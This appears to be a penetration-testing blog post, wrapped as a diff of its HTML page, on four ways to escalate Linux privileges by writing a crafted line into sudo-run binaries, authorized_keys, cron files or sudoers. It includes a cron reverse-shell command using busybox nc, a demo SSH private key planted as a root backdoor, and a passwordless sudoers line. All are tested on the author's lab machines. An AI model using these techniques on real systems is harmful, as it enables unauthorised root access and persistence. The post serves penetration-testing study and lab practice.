@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - 利用配置文件内容容错性实现权限提升的四种方式</title>
+        <meta name="description" content="the0n3">
+            <link rel="canonical" href="https://blog.the0n3.top">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+            <link rel="stylesheet" href="/assets/css/reading-progress.css">
+            <link rel="stylesheet" href="/assets/css/image-enhance.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+        <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+        <header>
+        <nav>
+            <div class="nav-right">
+                <a href="/">首页</a>
+                <a href="/archives">归档</a>
+                <a href="/categories">分类</a>
+                <a href="/tags">标签</a>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>利用配置文件内容容错性实现权限提升的四种方式</h1>
+    <p>
+        <span class="meta">发布于: 2025-11-29 00:10</span>
+    </p>
+    <div class="post-body">
+        <p>该利用方式为写入内容不完全可控条件下，构造出一个 <code>换行</code>，并完全控制一行内容，从而实现权限提升。</p>
+<p>核心思路：利用高敏感配置文件对文件内容格式的容错性以及写入后立即生效特性，构造恶意内容写入文件，从而实现提权。</p>
+<p>下面给出四种文件写提权方案</p>
+<h2>0、输出/写入内容覆写 sudo 文件</h2>
+<p>优点：简单暴力，无需寻找其他利用文件，覆写文件本身。<br>
+缺点：破坏性强，不可重复利用。</p>
+<p>如果是 sudo 文件，能构造出换行并控制写入其中一行内容，那么直接覆盖整个文件。如果不是二进制文件或没有使用 <code>#!</code> 指定解释器，默认作为 shell 脚本解析，bash 脚本默认遇到错误行仍然会继续往下走。</p>
+<p>扩展：</p>
+<ul>
+<li><a href="https://baike.baidu.com/item/%E9%AD%94%E6%95%B0/2464954">魔数</a></li>
+<li><a href="https://zh.wikipedia.org/wiki/Shebang">Shebang - 维基百科</a></li>
+<li><a href="https://blog.csdn.net/weixin_43999327/article/details/104553431">Linux - 认识shell的解释行（Shebang）</a></li>
+</ul>
+<p>这里以我的 Search 靶机来演示，提权方案是 sudo dirsearch，通过 dirsearch 的参数控制写入日志的行为，构造一个换行，然后完全控制一行内容，覆写 dirsearch 本身</p>
+<p><img src="/images/linux-config-privesc/25.png" alt=""></p>
+<p>成功控制文件写入内容，覆写 dirsearch，现在sudo 执行dirsearch 就会被当成 bash 脚本来执行</p>
+<p><img src="/images/linux-config-privesc/26.png" alt=""></p>
+<h2>1. SSH 授权公钥文件 (authorized_keys)</h2>
+<p>选择理由：authorized_keys 会将文件中的每一行解析为一条独立的公钥（空行和以 # 开头的注释行除外），只要整行语法合法就会被 sshd 接受并参与认证匹配。这种“逐行独立解析”的机制，使我们只需成功写入一行格式正确的公钥，就能在不破坏原有配置的前提下实现权限提升。</p>
+<p>优点：只需写入一行合法公钥即可提权<br>
+缺点：需要 .ssh 目录存在且权限正确<br>
+适用范围：大部分 Linux 发行版均适用，包括 Debian、Ubuntu、Alpine 等。</p>
+<p>文件的每一行包含一个密钥（空行和以“#”开头的行将被视为注释而忽略）。公钥由以下以空格分隔的字段组成：options、keytype、base64 编码的密钥和注释。options 字段是可选的。</p>
+<pre><code class="language-plaintext">[options] keytype base64编码的公钥数据 [comment]
+ssh-rsa AAAAB3NzaC1yc2E... test@test</code></pre>
+<p>man 手册<a href="https://man.openbsd.org/sshd">https://man.openbsd.org/sshd</a>中关于 authorized_keys 的描述：</p>
+<p><img src="/images/linux-config-privesc/1.png" alt=""></p>
+<p>准备一对 SSH 密钥对：</p>
+<p>公钥：</p>
+<pre><code class="language-plaintext">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAvB6zd9IbBFUZFVaVaHDbYxblzzWIURvbOCj2ix3g+m ssh-ed25519-20251128170612</code></pre>
+<p>私钥：</p>
+<pre><code class="language-plaintext">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtz
+c2gtZWQyNTUxOQAAACALwes3fSGwRVGRVWlWhw22MW5c81iFEb2zgo9osd4PpgAA
+AKBvt7BNb7ewTQAAAAtzc2gtZWQyNTUxOQAAACALwes3fSGwRVGRVWlWhw22MW5c
+81iFEb2zgo9osd4PpgAAAEBypkeI+1U7vOaeNLqi/CkDuVQPa2rXWF8peXA/0pUp
+qwvB6zd9IbBFUZFVaVaHDbYxblzzWIURvbOCj2ix3g+mAAAAGnNzaC1lZDI1NTE5
+LTIwMjUxMTI4MTcwNjEyAQID
+-----END OPENSSH PRIVATE KEY-----</code></pre>
+<p>测试：把公钥写入root用户的 <code>/root/.ssh/authorized_keys</code> 文件中</p>
+<p>.ssh 目录权限控制</p>
+<pre><code class="language-bash">mkdir -p /root/.ssh
+chmod 700 /root/.ssh</code></pre>
+<p>公钥写入内容</p>
+<pre><code class="language-plaintext">1a
+2b
+3c
+4d
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAvB6zd9IbBFUZFVaVaHDbYxblzzWIURvbOCj2ix3g+m ssh-ed25519-20251128170612
+5e
+6f
+7g
+8h
+9i</code></pre>
+<h3>Debian 10</h3>
+<p><img src="/images/linux-config-privesc/2.png" alt=""></p>
+<p>Kali SSH 可以成功登录 root</p>
+<p><img src="/images/linux-config-privesc/3.png" alt=""></p>
+<h3>Ubuntu 22.04</h3>
+<p>写入公钥</p>
+<p><img src="/images/linux-config-privesc/21.png" alt=""></p>
+<p>Kali SSH 可以成功登录 root</p>
+<p><img src="/images/linux-config-privesc/22.png" alt=""></p>
+<h3>Alpine</h3>
+<p>写入公钥</p>
+<p><img src="/images/linux-config-privesc/23.png" alt=""></p>
+<p>kali ssh可以成功登录root</p>
+<p><img src="/images/linux-config-privesc/24.png" alt=""></p>
+<h2>2. 系统定时任务文件（Cron）</h2>
+<p>选择理由：在 Alpine Linux（busybox crond）系统下，crond 会跳过语法错误的行并继续执行同一文件中其他合法的定时任务条目，不会因为单行错误而影响整体任务执行。在 Debian 系发行版（如 Debian、Ubuntu、Kali 等）中，如果 <code>/etc/crontab</code> 或 <code>/etc/cron.d/*</code> 中存在语法错误行，通常会导致整个该 crontab 文件被忽略。</p>
+<p>优点：只需写入一行合法定时任务即可提权<br>
+缺点：仅在 Alpine 系统下测试成功，Debian 系会因格式错误忽略整个定时任务文件<br>
+适用范围：仅在 Alpine（busybox crond）环境下测试验证通过。在 Debian、Ubuntu、Kali 等 Debian 系发行版中，由于 crond 在检测到语法错误时会忽略整个 crontab 文件，本方法在这些系统上实测无法稳定利用。</p>
+<p>常见定时任务文件位置与格式：</p>
+<pre><code class="language-plaintext">busybox crond   Alpine/容器精简系统   /etc/crontabs/&lt;user&gt;
+crond (Cronie)  CentOS / RHEL 系列    /etc/crontab + /etc/cron.d/*
+cron / Vixie cron   Debian / Ubuntu 系列  /etc/crontab + /etc/cron.d/*</code></pre>
+<p>文件内容格式：</p>
+<p>Alpine 系统下 <code>/etc/crontabs/&lt;user&gt;</code> 文件格式：</p>
+<pre><code class="language-plaintext">* * * * * command</code></pre>
+<p>非 Alpine 系统下 <code>/etc/crontab</code> 和 <code>/etc/cron.d/*</code> 文件格式：</p>
+<pre><code class="language-plaintext">* * * * * user command</code></pre>
+<p>对于非 Alpine 等精简系统，更推荐在 <code>/etc/cron.d/</code> 目录下放置定时任务文件，文件名可以任意命名。</p>
+<h3>Debian 10</h3>
+<p>测试：在 Debian 测试环境下，把恶意定时任务写入 <code>/etc/cron.d/rootRevShell</code> 文件中</p>
+<pre><code class="language-plaintext">1
+2
+3
+4
+* * * * * root /bin/bash -c "busybox nc 192.168.6.101 4444 -e bash"
+5
+6
+7
+8</code></pre>
+<p>Debian 下，通过日志定位，定时任务因为一行语法错误，整个定时任务文件被忽略</p>
+<pre><code class="language-plaintext">root@MazeSec:~# sudo grep cron /var/log/syslog | tail -20
+Nov 28 04:17:01 moban CRON[651]: (root) CMD (   cd / &amp;&amp; run-parts --report /etc/cron.hourly)
+Nov 28 04:28:01 moban cron[326]: Error: bad hour; while reading /etc/cron.d/rootRevShell
+Nov 28 04:28:01 moban cron[326]: (*system*rootRevShell) ERROR (Syntax error, this crontab file will be ignored)
+Nov 28 04:32:01 moban cron[326]: (*system*rootRevShell) RELOAD (/etc/cron.d/rootRevShell)
+Nov 28 04:32:01 moban cron[326]: Error: bad hour; while reading /etc/cron.d/rootRevShell
+Nov 28 04:32:01 moban cron[326]: (*system*rootRevShell) ERROR (Syntax error, this crontab file will be ignored)
+Nov 28 04:33:01 moban cron[326]: (*system*rootRevShell) RELOAD (/etc/cron.d/rootRevShell)
+Nov 28 04:33:01 moban cron[326]: Error: bad minute; while reading /etc/cron.d/rootRevShell
+Nov 28 04:33:01 moban cron[326]: (*system*rootRevShell) ERROR (Syntax error, this crontab file will be ignored)
+Nov 28 04:36:01 moban cron[326]: (*system*rootRevShell) RELOAD (/etc/cron.d/rootRevShell)
+Nov 28 04:38:01 moban cron[326]: (*system*rootRevShell) RELOAD (/etc/cron.d/rootRevShell)
+Nov 28 04:38:01 moban cron[326]: Error: bad minute; while reading /etc/cron.d/rootRevShell
+Nov 28 04:38:01 moban cron[326]: (*system*rootRevShell) ERROR (Syntax error, this crontab file will be ignored)</code></pre>
+<p><img src="/images/linux-config-privesc/4.png" alt=""></p>
+<h3>Kali</h3>
+<p>本地 Kali 尝试写入定时任务测试，同样因语法错误，整个定时任务文件被忽略</p>
+<p><img src="/images/linux-config-privesc/5.png" alt=""></p>
+<h3>Ubuntu 22.04</h3>
+<p>测试 Ubuntu 系统，同样因为语法错误，整个定时任务文件被忽略</p>
+<p><img src="/images/linux-config-privesc/6.png" alt=""></p>
+<p>好吧，有错误内容的定时任务在 Debian 系下似乎玩不转</p>
+<h3>Alpine</h3>
+<p>测试：在 Alpine 测试环境下，把恶意定时任务写入 <code>/etc/crontabs/root</code> 文件中，即使存在错误内容，仍然可以成功执行正确的定时任务行</p>
+<p><img src="/images/linux-config-privesc/7.png" alt=""></p>
+<p><img src="/images/linux-config-privesc/8.png" alt=""></p>
+<h2>3. sudo 配置文件（sudoers）</h2>
+<p>利用理由：sudoers 解析器在读取配置时会跳过语法错误的行，并继续解析后续合法配置行。这种“跳过错误行”的机制，使我们只需成功写入一行格式正确的恶意配置，就能在不破坏原有配置的前提下实现权限提升。</p>
+<p>优点：只需写入一行合法 sudoers 配置即可提权<br>
+缺点：未知<br>
+适用范围：大部分 Linux 发行版均适用，包括 Debian、Ubuntu、Alpine 等。</p>
+<p>sudoers 文件格式：</p>
+<pre><code class="language-plaintext">root    ALL=(ALL:ALL) ALL
+welcome ALL=(ALL:ALL) NOPASSWD:/path/to/xxx</code></pre>
+<div class="callout callout-caution">
+<p>实际操作建议：写入无密码的 sudo 权限配置，避免因目标用户需要输入密码而无法利用，当然，如果你知道用户密码，随意。</p>
+</div>
+<pre><code class="language-plaintext">user ALL=(ALL:ALL) NOPASSWD: ALL</code></pre>
+<h3>Debian 10</h3>
+<p>测试：在 Debian 测试环境下，把恶意 sudoers 配置写入 <code>/etc/sudoers.d/welcome</code> 文件中</p>
+<p>当前无 sudo 权限</p>
+<p><img src="/images/linux-config-privesc/9.png" alt=""></p>
+<p>切到 root，在 <code>/etc/sudoers.d/welcome</code> 文件中写入内容：</p>
+<pre><code class="language-plaintext">1
+2
+3
+4
+welcome ALL=(ALL:ALL) NOPASSWD: ALL
+5
+6
+7
+8</code></pre>
+<p><img src="/images/linux-config-privesc/10.png" alt=""></p>
+<p><img src="/images/linux-config-privesc/11.png" alt=""></p>
+<p>切回 welcome 用户，测试 sudo 权限提升成功</p>
+<p><img src="/images/linux-config-privesc/12.png" alt=""></p>
+<p>sudoers.d 的授权文件报了语法错误，不过问题不大，正确的行已经生效了，嫌报错碍事提权把文件里的错误行删掉即可。</p>
+<h3>Ubuntu 22.04</h3>
+<p>测试：在 Ubuntu 测试环境下，把恶意 sudoers 配置写入 <code>/etc/sudoers.d/welcome</code> 文件中</p>
+<p>当前无 sudo 权限</p>
+<p><img src="/images/linux-config-privesc/13.png" alt=""></p>
+<p>切到 root，在 <code>/etc/sudoers.d/welcome</code> 文件中写入内容：</p>
+<pre><code class="language-plaintext">1
+2
+3
+4
+welcome ALL=(ALL:ALL) NOPASSWD: ALL
+5
+6
+7
+8</code></pre>
+<p><img src="/images/linux-config-privesc/14.png" alt=""></p>
+<p>切回 welcome 用户，测试 sudo 权限提升成功</p>
+<p><img src="/images/linux-config-privesc/15.png" alt=""></p>
+<h3>Alpine</h3>
+<p>测试：在 Alpine 测试环境下，把恶意 sudoers 配置写入 <code>/etc/sudoers.d/welcome</code> 文件中</p>
+<p>当前无 sudo 权限</p>
+<p><img src="/images/linux-config-privesc/17.png" alt=""></p>
+<p>切到 root，在 <code>/etc/sudoers.d/welcome</code> 文件中写入内容：</p>
+<pre><code class="language-plaintext">1
+2
+3
+4
+welcome ALL=(ALL:ALL) NOPASSWD: ALL
+5
+6
+7
+8</code></pre>
+<p><img src="/images/linux-config-privesc/18.png" alt=""></p>
+<p>回到 welcome 用户，测试 sudo 权限提升成功</p>
+<p><img src="/images/linux-config-privesc/19.png" alt=""></p>
+<p><img src="/images/linux-config-privesc/20.png" alt=""></p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>渗透</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#config</span>
+                            </span>
+            </div>
+    </article>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+        <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+        <script src="/assets/js/readingProgress.js"></script>
+            <script src="/assets/js/imageEnhance.js"></script>
+        <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+</body>
+</html>
